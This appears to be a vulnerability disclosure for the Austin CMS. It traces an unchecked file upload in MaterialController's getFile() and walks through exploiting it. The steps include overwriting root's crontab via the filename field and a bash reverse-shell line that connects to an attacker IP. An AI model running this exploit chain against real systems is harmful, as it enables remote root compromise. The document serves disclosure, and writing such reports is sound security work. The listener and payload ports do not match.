cms url: https://github.com/ZhongFuCheng3y/austin    
The system has a file upload function in the upload material menu.
![image](https://github.com/biantaibao/Austin-CMS-report/assets/131763503/b2e87d77-d60c-453d-9370-831ce820606b)
Find the material upload interface in the code to analyze the code.  
com/java3y/austin/web/controller/MaterialController.java:49
![image](https://github.com/biantaibao/Austin-CMS-report/assets/131763503/fe960ba0-314b-4a78-aacb-82c37581f2a2)
Tracked the getFile() method, which directly wrote a file to the system without verifying the file name, so it can be determined that there is a file upload vulnerability here.
![image](https://github.com/biantaibao/Austin-CMS-report/assets/131763503/9a811acb-1175-4926-b30a-2aeab0242ee4)
Vulnerability exploitation process  
1.Open Kali and use NC to listen on the port  
nc lvvp 6666  
![1704642241_659ac6c196ce782c361b6](https://github.com/biantaibao/Austin-CMS-report/assets/131763503/8f943aad-f0d3-4958-833d-66529b54799b)  
2.Upload the modified crontab file  
![1704734971_659c30fbdd4b643bf8040](https://github.com/biantaibao/Austin-CMS-report/assets/131763503/105a6a75-461c-49f7-9611-95ce3f6114a9)  
3.Burpsuite intercepts and modifies file information  
payload:  
filename: /var/spool/cron/crontabs/root  
Bounce shell:*/1 * * * * bash -i >& dev/tcp/192.168.25.128/9999 0>&1  
![1704735877_659c3485d29cc05793811](https://github.com/biantaibao/Austin-CMS-report/assets/131763503/a20e59dd-508a-4b31-8cd2-b51f0536da76)    
4.Successfully rebounded shell on Kali  
![1704736179_659c35b32f8ec6b903c86](https://github.com/biantaibao/Austin-CMS-report/assets/131763503/dc6bba95-6180-4f93-9f15-9ec5ffe1c976)










